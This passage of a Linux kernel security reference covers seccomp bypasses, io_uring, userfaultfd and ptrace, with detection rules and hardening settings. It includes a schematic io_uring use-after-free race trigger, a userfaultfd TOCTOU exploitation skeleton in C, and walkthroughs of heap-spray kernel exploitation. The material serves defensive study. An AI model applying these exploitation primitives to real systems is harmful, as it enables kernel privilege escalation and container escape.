### 3.8 Seccomp bypass techniques

Several classes of bypass undermine seccomp's containment guarantees:

**Architecture-switching bypass.** As described in §1.3, a 64-bit process can issue `int 0x80` with 32-bit syscall numbers. If the seccomp filter checks `nr` without first validating `arch`, the attacker can invoke any 32-bit syscall. The fix is the architecture check shown in §3.3 and §3.7 — every production filter must reject unexpected `arch` values.

**TOCTOU on pointer arguments.** Seccomp inspects the register values at the time of the check. For pointer arguments (filenames in `openat`, buffer addresses in `read`), the pointed-to memory can be changed by another thread between the seccomp check and the kernel's `copy_from_user`. This means argument-based filtering on pointer values is fundamentally unreliable for security purposes. Seccomp cannot prevent a sandboxed process from opening an arbitrary file by filtering the `filename` argument — it can only filter the `dirfd` or `flags` arguments (which are integer values in registers). The only reliable approach is to deny the entire syscall or use the `SECCOMP_RET_USER_NOTIF` mechanism where the supervisor performs the check with proper locking.

**io_uring bypass.** Before Linux 5.19, `io_uring` operations were completely invisible to seccomp filters. A process with an `io_uring` ring could perform `openat`, `read`, `write`, `connect`, `accept`, and dozens of other operations without triggering any seccomp check — the operations dispatch through the `io_uring` submission path, not through `entry_SYSCALL_64` and the `sys_call_table`. The mitigation is to block the `io_uring_setup`, `io_uring_enter`, and `io_uring_register` syscalls in the seccomp filter (these three are the only actual syscalls `io_uring` uses; the operations submitted through the ring are not syscalls). This concern was a major driver behind Google's recommendation to disable `io_uring` in ChromeOS and Android environments. The CVE-2021-33909 (Sequoia, `seq_file` size_t overflow) disclosure in the same period heightened awareness of kernel attack surface in general, reinforcing the case for aggressive seccomp profiles that minimize kernel entry points.

**`SECCOMP_RET_USER_NOTIF` exploitation scenarios.** The notification mechanism introduces a new attack surface. If the supervisor process is compromised, it controls the return values for all notified syscalls in the sandboxed process — it can forge file descriptors, fake error codes, or allow dangerous operations. Additionally, the TOCTOU window between the notification and the supervisor's response is exploitable: the supervised process can modify its own memory (the arguments the supervisor reads via `/proc/PID/mem`) between the notification and the response. The `SECCOMP_IOCTL_NOTIF_ID_VALID` check helps but is not atomic with the supervisor's action. Best practice: supervisors should use `pidfd_getfd` (Linux 5.6+) to directly transplant file descriptors rather than opening files and sending fds via `SCM_RIGHTS`, and should `SECCOMP_IOCTL_NOTIF_ID_VALID` immediately before responding.

**Container escape via seccomp misconfiguration.** Docker's default seccomp profile blocks approximately 44 syscalls (out of ~450). Common misconfigurations that enable escape include: allowing `mount` (enables namespace manipulation), allowing `ptrace` (enables injection into other containers sharing a PID namespace), allowing `unshare` with `CLONE_NEWUSER` (enables user namespace creation for privilege escalation), allowing `io_uring_setup` (enables seccomp bypass via io_uring), and running with `--security-opt seccomp=unconfined` (disables seccomp entirely). Each of these has been exploited in real container breakouts.

### 3.9 Seccomp detection and hardening

**Auditd rules for seccomp violations.** When seccomp kills a process, the kernel generates an audit event (`type=SECCOMP`). The following `auditd` rules capture these events and related syscall activity:

```bash
# /etc/audit/rules.d/seccomp.rules
# Log all seccomp filter installations
-a always,exit -F arch=b64 -S seccomp -k seccomp_filter
-a always,exit -F arch=b64 -S prctl -F a0=0x16 -k seccomp_prctl
# 0x16 = PR_SET_SECCOMP (22 decimal)

# Log seccomp-related process kills (SIGSYS)
-a always,exit -F arch=b64 -S kill -F a1=0x1f -k seccomp_sigsys
# 0x1f = SIGSYS (31 decimal)
```

**Sigma rule for seccomp bypass attempts.**

```yaml
title: Potential seccomp bypass via io_uring
id: d7e8f1a2-3b4c-5d6e-7f8a-9b0c1d2e3f4a
status: experimental
description: Detects io_uring_setup syscall in containerized processes where seccomp should be blocking I/O
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: io_uring_setup
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1055
```

**Recommended container seccomp profiles.** Docker's default profile is a reasonable baseline. For hardened environments, the profile should be tightened to explicitly block high-risk syscalls:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "defaultErrnoRet": 1,
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": ["read", "write", "close", "fstat", "lseek", "mmap",
                "mprotect", "munmap", "brk", "rt_sigaction", "rt_sigprocmask",
                "rt_sigreturn", "ioctl", "pread64", "pwrite64", "readv",
                "writev", "access", "pipe", "select", "sched_yield",
                "mremap", "msync", "mincore", "madvise", "dup", "dup2",
                "nanosleep", "getpid", "socket", "connect", "accept",
                "sendto", "recvfrom", "bind", "listen", "getsockname",
                "getpeername", "setsockopt", "getsockopt", "clone",
                "fork", "execve", "exit", "wait4", "kill", "uname",
                "fcntl", "flock", "fsync", "fdatasync", "getcwd",
                "chdir", "openat", "mkdirat", "newfstatat", "unlinkat",
                "renameat2", "futex", "getdents64", "set_tid_address",
                "clock_gettime", "clock_nanosleep", "exit_group",
                "epoll_ctl", "epoll_wait", "epoll_create1", "getrandom",
                "prlimit64", "arch_prctl", "set_robust_list",
                "get_robust_list", "rseq", "clone3", "close_range",
                "faccessat2"],
      "action": "SCMP_ACT_ALLOW"
    },
    {
      "names": ["io_uring_setup", "io_uring_enter", "io_uring_register",
                "ptrace", "mount", "umount2", "pivot_root", "swapon",
                "swapoff", "reboot", "kexec_load", "kexec_file_load",
                "init_module", "finit_module", "delete_module",
                "userfaultfd", "perf_event_open", "bpf",
                "lookup_dcookie", "keyctl", "request_key", "add_key",
                "move_mount", "fsopen", "fsconfig", "fsmount",
                "fspick", "open_tree", "unshare"],
      "action": "SCMP_ACT_ERRNO",
      "errnoRet": 1
    }
  ]
}
```

For Kubernetes, the equivalent uses the `SeccompProfile` type in the Pod security context (see Chapter 2C for the orchestration layer).

---

## 4. `io_uring`

### 4.1 Overview

`io_uring` is a high-performance asynchronous I/O interface introduced in Linux 5.1. It provides two ring buffers (the submission queue, SQ, and the completion queue, CQ) shared between user space and the kernel via `mmap`. User space writes submission queue entries (SQEs) describing I/O operations and the kernel processes them asynchronously, writing completion queue entries (CQEs) with results.

The interface uses three system calls: `io_uring_setup` (create the rings), `io_uring_enter` (submit entries and/or wait for completions), and `io_uring_register` (register buffers, files, or other resources for reuse).

### 4.2 Security implications

`io_uring` is one of the largest additions to the kernel's attack surface in recent years, for several reasons:

**Massive syscall-equivalent surface.** `io_uring` supports over 60 operation types (called "opcodes") that effectively replicate the functionality of dozens of system calls: `read`, `write`, `openat`, `close`, `accept`, `connect`, `send`, `recv`, `splice`, `mknod`, `symlink`, `link`, `unlink`, `rename`, `mkdir`, `statx`, `fadvise`, `madvise`, `socket`, `bind`, `listen`, `sendmsg`, `recvmsg`, `shutdown`, `waitid`, and more. Each of these is a kernel code path that is accessible without making a traditional system call — the operations go through the `io_uring` submission path rather than `entry_SYSCALL_64`.

**Seccomp bypass.** Because `io_uring` operations are not dispatched through `sys_call_table`, they are not intercepted by seccomp-bpf filters. A process with `io_uring` access can perform `openat`, `read`, `write`, `connect`, and dozens of other operations that a seccomp filter might be blocking. This was the motivating concern behind restricting `io_uring` in sandboxed environments. Since Linux 5.19, `io_uring` can be disabled per-process via seccomp (by filtering the `io_uring_setup` and `io_uring_enter` syscalls themselves), and since Linux 6.0, a sysctl `io_uring_disabled` can disable `io_uring` system-wide (0 = enabled, 1 = disabled for unprivileged, 2 = disabled entirely).

**Kernel attack surface.** The `io_uring` codebase is complex (tens of thousands of lines in `io_uring/`) and relatively new. It has been a frequent source of kernel vulnerabilities: memory corruptions, use-after-free bugs, and reference-counting errors. Google's security team identified `io_uring` as the single largest contributor to kernel exploitation in the Android/ChromeOS threat model and pushed for it to be disabled in those environments. Container hardening guidance now recommends blocking `io_uring_setup` in seccomp profiles unless the workload explicitly requires it.

**Credential handling.** `io_uring` operations can execute with credentials different from the submitting thread if the ring was set up with `IORING_SETUP_SQPOLL` (a kernel thread polls the SQ and submits on behalf of the user) or if `io_uring_register` with `IORING_REGISTER_PERSONALITY` has been used to register alternate credentials. This adds complexity to privilege reasoning.

### 4.3 SQ/CQ ring architecture

The shared-memory architecture of `io_uring` is central to both its performance and its attack surface. `io_uring_setup` returns parameters describing the ring layout:

```c
struct io_uring_params {
    __u32 sq_entries;       /* requested/actual SQ size (power of 2) */
    __u32 cq_entries;       /* requested/actual CQ size */
    __u32 flags;            /* IORING_SETUP_* flags */
    __u32 sq_thread_cpu;    /* SQ poll thread CPU affinity */
    __u32 sq_thread_idle;   /* SQ poll thread idle timeout (ms) */
    __u32 features;         /* kernel feature flags */
    __u32 wq_fd;            /* share async backend with another ring */
    __u32 resv[3];
    struct io_sqring_offsets sq_off;  /* mmap offsets for SQ ring */
    struct io_cqring_offsets cq_off;  /* mmap offsets for CQ ring */
};
```

User space `mmap`s three regions: the SQ ring (containing the `head`, `tail`, and `flags` pointers, plus the SQ index array), the CQ ring (containing `head`, `tail`, `flags`, and the CQE array), and the SQE array. The SQ ring contains indices into the SQE array, not the SQEs themselves — this allows out-of-order submission.

Each SQE (submission queue entry) is 64 bytes:

```c
struct io_uring_sqe {
    __u8  opcode;           /* IORING_OP_* (e.g., IORING_OP_READV = 1) */
    __u8  flags;            /* IOSQE_* flags */
    __u16 ioprio;
    __s32 fd;               /* file descriptor */
    union {
        __u64 off;          /* offset */
        __u64 addr2;
    };
    union {
        __u64 addr;         /* buffer address or pointer */
        __u64 splice_off_in;
    };
    __u32 len;              /* buffer length or count */
    union {
        __kernel_rwf_t rw_flags;
        __u32 fsync_flags;
        __u32 open_flags;
        __u32 statx_flags;
        /* ... many more union members per opcode */
    };
    __u64 user_data;        /* passed through to CQE for correlation */
    union {
        __u16 buf_index;
        __u16 buf_group;
    };
    __u16 personality;      /* registered personality index */
    union {
        __s32 splice_fd_in;
        __u32 file_index;
        struct { __u16 addr_len; __u16 __pad3[1]; };
    };
    __u64 addr3;
    __u64 __pad2[1];
};
```

Each CQE (completion queue entry) is 16 bytes:

```c
struct io_uring_cqe {
    __u64 user_data;        /* from the SQE, for correlation */
    __s32 res;              /* result (like syscall return value) */
    __u32 flags;            /* IORING_CQE_F_* flags */
};
```

The kernel and user space coordinate via the `head`/`tail` pointers with memory barriers (`io_uring_smp_store_release`, `io_uring_smp_load_acquire`). The SQ `tail` is written by user space; the SQ `head` is written by the kernel (after consuming an entry). The CQ `tail` is written by the kernel; the CQ `head` is written by user space (after consuming a completion). This lock-free single-producer/single-consumer design eliminates syscall overhead for submission (with `IORING_SETUP_SQPOLL`) and completion.

The security concern is that the shared-memory region is a trust boundary: the kernel must validate every field of every SQE, because user space controls the entire SQ ring. Any failure to validate an opcode, fd, offset, length, or flags field is a potential vulnerability. The large union in `io_uring_sqe` — with different fields having different meanings depending on the opcode — makes this validation complex and error-prone.

### 4.4 io_uring CVE walkthroughs

The complexity of io_uring's internal state management has produced a steady stream of exploitable vulnerabilities:

**CVE-2022-29582 (UAF in io_uring timeout handling, Linux 5.15–5.17).** The vulnerability existed in the `io_flush_timeouts` function. When a timeout linked to a specific SQE completed, the kernel freed the `io_timeout` structure. However, a concurrent cancellation path (`io_timeout_cancel`) could race with the completion and access the freed structure, producing a use-after-free. An attacker could trigger this by submitting a timeout-linked request and immediately cancelling it from another thread. The freed object (from the `kmalloc-192` or `kmalloc-256` slab, depending on kernel version) could be reclaimed with a controlled allocation (e.g., `sendmsg` with a crafted `msghdr`), giving the attacker control over the timeout's callback pointer. Exploitation yielded arbitrary kernel code execution.

**CVE-2023-2598 (io_uring fixed buffer registration, Linux 6.1–6.3).** This vulnerability was in `io_sqe_buffer_register`, the function that pins user-space pages for registered buffers. The kernel calculated the number of pages to pin but used the wrong compound page order for huge pages, leading to a situation where the kernel pinned fewer pages than the registered buffer length implied. A subsequent `IORING_OP_READ_FIXED` or `IORING_OP_WRITE_FIXED` could then read or write beyond the pinned region, accessing adjacent physical memory belonging to other processes or the kernel. This was a classic bounds-check error in a complex memory management path.

**CVE-2024-0582 (io_uring provided buffers, Linux 6.4–6.7).** The provided-buffer (`IORING_OP_PROVIDE_BUFFERS`) mechanism lets user space pre-register a pool of buffers that the kernel selects from when completing requests. The vulnerability was in the buffer-group recycling logic: when a buffer group was unregistered while completions referencing its buffers were still in flight, the kernel freed the buffer metadata but the CQEs still contained pointers to the freed buffers. When user space read the CQE and accessed the buffer address, it was a use-after-free in user-space-visible memory. The kernel-side metadata free could be triggered to corrupt kernel heap state.

In all three cases, the exploitation pattern follows the general kernel UAF playbook described in Domain 5 Chapter 5A: trigger the free, reclaim the freed object with a controlled allocation (using `msghdr`, `sk_buff`, `msg_msg`, or cross-cache techniques), and redirect a function pointer or corrupt a length field to achieve arbitrary read/write.

### 4.5 io_uring UAF exploitation pattern

The following C code demonstrates the trigger for a simplified io_uring UAF (modeled on CVE-2022-29582's race pattern). This is a schematic illustration — real exploitation requires precise timing and heap layout control:

```c
/* io_uring_uaf_trigger.c — Schematic UAF trigger via timeout race
 * Educational only. Requires a vulnerable kernel (5.15–5.17).
 * Build: gcc -O2 -o io_uring_uaf_trigger io_uring_uaf_trigger.c -luring
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <liburing.h>
#include <sys/mman.h>

#define RING_SIZE 64

static struct io_uring ring;
static volatile int race_go = 0;

/* Thread 1: submit a timeout linked to a NOP */
static void *submit_timeout(void *arg)
{
    struct io_uring_sqe *sqe;
    struct __kernel_timespec ts = { .tv_sec = 10, .tv_nsec = 0 };

    /* Submit a NOP with a linked timeout */
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_nop(sqe);
    sqe->flags |= IOSQE_IO_LINK;
    sqe->user_data = 0x41414141;

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_timeout(sqe, &ts, 0, 0);
    sqe->user_data = 0x42424242;

    io_uring_submit(&ring);

    race_go = 1;
    return NULL;
}

/* Thread 2: cancel the timeout to trigger the race */
static void *cancel_timeout(void *arg)
{
    struct io_uring_sqe *sqe;

    while (!race_go)
        ;  /* spin until timeout is submitted */

    /* Attempt to cancel — races with the timeout completion path */
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_timeout_remove(sqe, 0x42424242, 0);
    sqe->user_data = 0x43434343;

    io_uring_submit(&ring);
    return NULL;
}

int main(void)
{
    struct io_uring_params params = { 0 };
    pthread_t t1, t2;

    if (io_uring_queue_init_params(RING_SIZE, &ring, &params) < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    /* Race the submission and cancellation */
    for (int i = 0; i < 10000; i++) {
        race_go = 0;
        pthread_create(&t1, NULL, submit_timeout, NULL);
        pthread_create(&t2, NULL, cancel_timeout, NULL);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);

        /* Drain completions */
        struct io_uring_cqe *cqe;
        unsigned head;
        io_uring_for_each_cqe(&ring, head, cqe) {
            /* On a vulnerable kernel, a UAF may have occurred here */
        }
        io_uring_cq_advance(&ring, 3);
    }

    io_uring_queue_exit(&ring);
    printf("Race completed %d iterations\n", 10000);
    return 0;
}
```

In a real exploit, the attacker would pair the UAF trigger with a heap spray to reclaim the freed `io_timeout` object, overwriting its function pointer with a controlled value. The `msg_msg` spray technique (allocating `sendmsg` messages of the target slab size) is commonly used for this purpose.

### 4.6 io_uring detection and hardening

**eBPF-based detection.** Attach to the `io_uring_setup` tracepoint (or `raw_syscalls:sys_enter` filtering for NR 425 on x86_64) to detect io_uring ring creation. Correlate with container context via `bpf_get_current_cgroup_id()` to identify unexpected io_uring usage in sandboxed environments.

**Sigma rule for io_uring abuse.**

```yaml
title: io_uring ring creation in containerized process
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects io_uring_setup syscall which may indicate an attempt to bypass
  seccomp filters or exploit kernel vulnerabilities through the io_uring subsystem
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: SYSCALL
        syscall: io_uring_setup
    filter_known:
        exe:
            - /usr/bin/known_io_uring_user
    condition: selection and not filter_known
level: high
tags:
    - attack.defense_evasion
    - attack.privilege_escalation
    - attack.t1068
```

**Hardening via sysctl.** The `io_uring_disabled` sysctl (Linux 6.0+) provides system-wide control:

```bash
# Disable io_uring for unprivileged users
echo 1 > /proc/sys/io_uring_disabled

# Disable io_uring entirely (even for root)
echo 2 > /proc/sys/io_uring_disabled
```

For environments where io_uring is needed by specific workloads, the seccomp filter should allow `io_uring_setup` only for those processes. grsecurity provides additional io_uring restrictions including per-role policies and reduced opcode sets.

---

## 5. `userfaultfd`

### 5.1 Mechanism

`userfaultfd` (ufd) creates a file descriptor that receives notifications when a registered memory region is accessed and triggers a page fault. The registering process (or a cooperating monitor) can then supply the page contents from user space.

Setup: `userfaultfd(flags)` returns a fd. The caller then uses `ioctl(fd, UFFDIO_API, ...)` to negotiate the API version and `ioctl(fd, UFFDIO_REGISTER, ...)` to register a range of virtual addresses for monitoring. When a thread faults on a registered page:

1. The faulting thread blocks in the kernel (inside `handle_userfault`, called from the page fault handler).
2. A message describing the fault (address, flags) is readable from the userfaultfd fd.
3. The monitor supplies page contents via `ioctl(fd, UFFDIO_COPY, ...)` (copy a page from a user buffer) or `ioctl(fd, UFFDIO_ZEROPAGE, ...)` (install a zero page).
4. The faulting thread wakes and resumes.

Legitimate uses include post-copy live migration (VM memory pages are transferred on demand as they are accessed), garbage collectors (user-space page-level dirty tracking), and some database engines.

### 5.2 Exploitation relevance

`userfaultfd` provides a controlled, indefinite pause at the exact moment of a page fault — and this property is extremely valuable for exploiting kernel race conditions (TOCTOU bugs).

The pattern: many kernel code paths copy data from user space in two stages — first they validate or inspect it (`copy_from_user` or `get_user`), then they use it. If the user-space memory is backed by a `userfaultfd`-registered page, the attacker can:

1. Set up a `userfaultfd` on a page.
2. Trigger a kernel operation that reads from that page.
3. The kernel's `copy_from_user` faults on the registered page. The faulting kernel thread blocks.
4. The attacker's monitor thread runs. It can now modify other state, set up a race condition, or supply the page with contents that differ from what the kernel would have seen initially.
5. The monitor supplies the page via `UFFDIO_COPY`. The kernel thread wakes and continues with data that may be inconsistent with the validation done in step 2.

This technique has been used in numerous kernel exploits. The mitigation is `sysctl vm.unprivileged_userfaultfd = 0` (default on many hardened distributions since Linux 5.2), which restricts `userfaultfd` to `CAP_SYS_PTRACE` processes. Unprivileged code can no longer create a userfaultfd, breaking the exploitation primitive.

Note: the kernel community has also hardened many copy-from-user paths to use `copy_from_user` variants that pin pages or use `access_ok` + direct copy in a way that reduces the userfaultfd window, but the definitive mitigation is restricting the syscall itself.

### 5.3 TOCTOU exploitation via userfaultfd

The following code demonstrates the complete userfaultfd-based TOCTOU exploitation pattern. This is the skeleton used by numerous kernel exploits (CVE-2016-0728, CVE-2021-22555, and others) to win race conditions deterministically rather than probabilistically:

```c
/* userfaultfd_toctou.c — Deterministic TOCTOU via userfaultfd
 * Educational skeleton. Requires vm.unprivileged_userfaultfd=1 (vuln config).
 * Build: gcc -O2 -o userfaultfd_toctou userfaultfd_toctou.c -lpthread
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <pthread.h>
#include <fcntl.h>
#include <poll.h>
#include <errno.h>

#define PAGE_SIZE 4096

static int uffd;
static void *uffd_page;

/* Fault handler thread: intercepts the page fault, performs the race
 * window actions, then supplies the page to unblock the faulting thread. */
static void *fault_handler(void *arg)
{
    struct uffd_msg msg;
    struct uffdio_copy copy;
    struct pollfd pollfd;
    char page_contents[PAGE_SIZE];

    pollfd.fd = uffd;
    pollfd.events = POLLIN;

    printf("[handler] Waiting for page fault...\n");

    if (poll(&pollfd, 1, -1) < 0) {
        perror("poll");
        return NULL;
    }

    if (read(uffd, &msg, sizeof(msg)) != sizeof(msg)) {
        perror("read uffd");
        return NULL;
    }

    if (msg.event != UFFD_EVENT_PAGEFAULT) {
        fprintf(stderr, "Unexpected event: %d\n", msg.event);
        return NULL;
    }

    printf("[handler] Fault at %p — race window is OPEN\n",
           (void *)msg.arg.pagefault.address);

    /*
     * === RACE WINDOW ===
     * The kernel thread that triggered copy_from_user is now blocked.
     * The attacker can:
     * 1. Modify kernel state (e.g., free an object that will be used
     *    after the copy completes)
     * 2. Trigger a different allocation to reclaim freed memory
     * 3. Set up conditions for the vulnerability
     *
     * Example: for CVE-2021-22555 (Netfilter), the attacker would free
     * the target slab object and spray replacement data here.
     */
    printf("[handler] Performing race actions...\n");
    usleep(100000);  /* simulate race window work */

    /* Supply the page — kernel thread resumes with attacker-controlled data */
    memset(page_contents, 'A', PAGE_SIZE);
    /* Craft specific page contents to trigger the vulnerability */

    copy.src = (unsigned long)page_contents;
    copy.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
    copy.len = PAGE_SIZE;
    copy.mode = 0;
    copy.copy = 0;

    if (ioctl(uffd, UFFDIO_COPY, &copy) < 0) {
        perror("UFFDIO_COPY");
        return NULL;
    }

    printf("[handler] Page supplied — race window CLOSED\n");
    return NULL;
}

int main(void)
{
    struct uffdio_api api;
    struct uffdio_register reg;
    pthread_t handler_thread;

    /* Create userfaultfd */
    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0) {
        perror("userfaultfd (is vm.unprivileged_userfaultfd=1?)");
        return 1;
    }

    /* Negotiate API version */
    api.api = UFFD_API;
    api.features = 0;
    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
        perror("UFFDIO_API");
        return 1;
    }

    /* Allocate a page-aligned region for the trap */
    uffd_page = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (uffd_page == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Register the region with userfaultfd */
    reg.range.start = (unsigned long)uffd_page;
    reg.range.len = PAGE_SIZE;
    reg.mode = UFFDIO_REGISTER_MODE_MISSING;
    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
        perror("UFFDIO_REGISTER");
        return 1;
    }

    /* Start the fault handler thread */
    pthread_create(&handler_thread, NULL, fault_handler, NULL);

    /*
     * Now trigger the vulnerable kernel path that reads from uffd_page.
     * For example: a syscall that calls copy_from_user on our page.
     * The kernel thread will block on the page fault, the handler thread
     * gets the race window, and the page is supplied with crafted data.
     */
    printf("[main] Triggering kernel read from uffd-registered page...\n");

    /* Example: pass uffd_page as an argument to a vulnerable syscall.
     * The specific syscall depends on the target vulnerability. */
    /* syscall(__NR_vulnerable_syscall, uffd_page, ...); */

    /* For demonstration: just read the page to trigger the fault */
    volatile char c = *(volatile char *)uffd_page;
    (void)c;

    pthread_join(handler_thread, NULL);
    printf("[main] TOCTOU exploitation complete\n");

    munmap(uffd_page, PAGE_SIZE);
    close(uffd);
    return 0;
}
```

### 5.4 CVE case studies using userfaultfd

**CVE-2016-0728 (keyring refcount overflow).** The vulnerability was in the `KEYCTL_JOIN_SESSION_KEYRING` operation, where a reference count on a `struct key` object could be incremented without bound by repeatedly joining the same session keyring. The refcount was a 32-bit `atomic_t`; after 2^32 increments (feasible on fast hardware in ~30 minutes), it wrapped to zero, the kernel treated the object as freed, and a subsequent access was a use-after-free. `userfaultfd` was not strictly necessary for this exploit (the race was won by brute-force repetition), but later refinements of the technique used `userfaultfd` to create a deterministic window for heap manipulation between the free and the reuse.

**CVE-2021-22555 (Netfilter `setsockopt` out-of-bounds write).** A heap out-of-bounds write in the Netfilter `xt_compat` layer (triggered via `setsockopt(IPT_SO_SET_REPLACE)`) could corrupt adjacent slab objects. The exploit used `userfaultfd` to pause the kernel at a precise point: the setsockopt handler called `copy_from_user` on the user-supplied iptables ruleset, and by placing the second page of the ruleset on a `userfaultfd`-registered page, the attacker could pause execution between the first `copy_from_user` (which allocated kernel memory based on the header) and the second (which would write the crafted payload). During the pause, the attacker sprayed the heap to position a victim object adjacent to the allocated buffer, then supplied the malicious second page to trigger the overwrite. This exploit achieved container escape from an unprivileged container.

### 5.5 userfaultfd detection and hardening

**Monitoring userfaultfd usage.** The userfaultfd syscall (NR 323 on x86_64) should be audited in production environments:

```bash
# Auditd rule to log all userfaultfd creation
-a always,exit -F arch=b64 -S userfaultfd -k userfaultfd_create
```

In eBPF-based monitoring (Falco, Tracee, Tetragon), attach to `raw_syscalls:sys_enter` and filter for NR 323. Alert on any invocation from unprivileged processes or from within containers.

**Hardening sysctl.**

```bash
# Restrict userfaultfd to CAP_SYS_PTRACE (recommended for all production systems)
echo 0 > /proc/sys/vm/unprivileged_userfaultfd

# Persist across reboots
echo 'vm.unprivileged_userfaultfd = 0' >> /etc/sysctl.d/99-security.conf
```

This single sysctl eliminates userfaultfd as an exploitation primitive for unprivileged attackers. It is the single highest-impact kernel hardening sysctl for reducing the exploitability of kernel race conditions. Most distributions (Debian 11+, Ubuntu 20.04+, RHEL 8+, Fedora 33+) now default to `0`.

---

## 6. `pidfd` and cross-process memory access

### 6.1 `pidfd`

`pidfd` (process file descriptor) is a race-free process handle, introduced across Linux 5.1–5.4. Historically, processes were identified by PIDs, which are reusable — between the time you observe a PID and the time you act on it, the process could have exited and its PID recycled. `pidfd` closes this TOCTOU gap.

`pidfd_open(pid, flags)` returns a file descriptor referring to the process with the given PID. The fd holds a reference to the process's `task_struct` (actually its `struct pid`), so even if the PID is recycled, the fd still refers to the original process (or becomes invalid — it never refers to a different process).

Operations on pidfds: `pidfd_send_signal(pidfd, sig, info, flags)` sends a signal race-free. `waitid(P_PIDFD, pidfd, ...)` waits for the process. `pidfd` can be polled (`poll`/`epoll`) to detect process exit. `clone3` with `CLONE_PIDFD` returns a pidfd for the child directly.

### 6.2 `process_vm_readv` / `process_vm_writev`

These syscalls (Linux 3.2+) provide direct cross-process memory access:

```c
ssize_t process_vm_readv(pid_t pid,
    const struct iovec *local_iov, unsigned long liovcnt,
    const struct iovec *remote_iov, unsigned long riovcnt,
    unsigned long flags);
```

`process_vm_readv` copies data from the target process's address space into the calling process's buffers. `process_vm_writev` does the reverse. The kernel implements these by walking the target process's page tables, finding the physical pages, and copying through the kernel's direct map — no context switch to the target process is needed.

Access checks: the calling process must have `PTRACE_MODE_ATTACH_REALCREDS` permission to the target (same check as `ptrace(PTRACE_ATTACH)` — see §7.4). This means, in the default configuration, same-UID processes can read/write each other's memory, but cross-UID access requires `CAP_SYS_PTRACE` or root.

These syscalls are faster than `ptrace(PTRACE_PEEKDATA)` for bulk memory reads (they transfer `iov`-sized chunks rather than one word at a time) and are the preferred mechanism for debuggers, profilers, and process-injection tools.

Security relevance: `process_vm_readv`/`process_vm_writev` are powerful primitives. A process with these permissions can read secrets from another process's memory (passwords, crypto keys, tokens). Yama LSM's scope restrictions (§7.5) apply to the ptrace access check that gates these calls.

---

## 7. `ptrace`

### 7.1 Overview

`ptrace` is the kernel's process-tracing interface. A tracer process can attach to a tracee, inspect and modify its registers and memory, intercept its system calls, and control its execution. Debuggers (`gdb`, `lldb`), tracers (`strace`, `ltrace`), and some sandboxing systems (early gVisor, some seccomp `SECCOMP_RET_TRACE` handlers) are built on ptrace.

### 7.2 Attach mechanisms

**`PTRACE_ATTACH`**: the tracer sends `PTRACE_ATTACH` to a target PID. The kernel checks ptrace access permissions (§7.4), and if allowed, the tracee is stopped with `SIGSTOP` and the tracer becomes its parent (for wait purposes). The tracer can then issue ptrace commands.

**`PTRACE_SEIZE`** (Linux 3.4+): like `PTRACE_ATTACH` but does not stop the tracee immediately. The tracer must explicitly interrupt the tracee with `PTRACE_INTERRUPT` when it wants to inspect state. Preferred over `PTRACE_ATTACH` for non-intrusive monitoring.

**`PTRACE_TRACEME`**: called by the tracee itself (typically the child after `fork` but before `execve`). The tracee's parent becomes the tracer. This is how `strace` and `gdb` work: fork, child calls `PTRACE_TRACEME`, child `execve`s, parent waits and traces.

### 7.3 Key operations

**`PTRACE_PEEKDATA` / `PTRACE_POKEDATA`**: read/write one `long` (8 bytes on x86_64) from/to the tracee's memory at a given address. Implemented by walking the tracee's page tables through the kernel. Slow for bulk access (one word per ptrace call — each is a full syscall round-trip); `process_vm_readv` is preferred for large reads.

**`PTRACE_GETREGS` / `PTRACE_SETREGS`**: read/write the tracee's general-purpose register set (the `pt_regs` structure from the tracee's kernel stack). On x86_64, this gives access to all 16 GPRs, RIP, RFLAGS, segment registers.

**`PTRACE_GETREGSET` / `PTRACE_SETREGSET`**: the generic, architecture-independent version using `NT_*` register set constants. `NT_PRSTATUS` for GPRs, `NT_FPREGSET` for FPU, `NT_X86_XSTATE` for extended state (AVX, AVX-512), `NT_ARM_VFP` for ARM VFP, etc.

**`PTRACE_SYSCALL`**: resume the tracee and stop it at the next system call entry or exit. This is how `strace` intercepts syscalls: it calls `PTRACE_SYSCALL` repeatedly, and at each stop it reads `orig_rax` (the syscall number), the arguments (from `pt_regs`), and the return value (from `rax` at syscall exit).

**`PTRACE_SINGLESTEP`**: execute one instruction and stop. Used by debuggers for single-stepping.

**`PTRACE_CONT`**: resume the tracee.

### 7.4 Ptrace access mode checks

The kernel checks ptrace access in `__ptrace_may_access`, which evaluates two access modes:

**`PTRACE_MODE_READ`**: required for operations that only read the tracee's state (e.g., `PTRACE_PEEKDATA`, `PTRACE_GETREGS`, reading `/proc/PID/mem`). The check is: the tracer's real/effective/saved UID matches the tracee's real/effective/saved UID and GID, or the tracer has `CAP_SYS_PTRACE`.

**`PTRACE_MODE_ATTACH`**: required for operations that modify the tracee or attach to it (`PTRACE_ATTACH`, `PTRACE_POKEDATA`, `PTRACE_SETREGS`, `process_vm_writev`). Stricter: all the `MODE_READ` checks, plus the tracee must not be undumpable (`/proc/PID/status` dumpable flag), and LSM hooks are called.

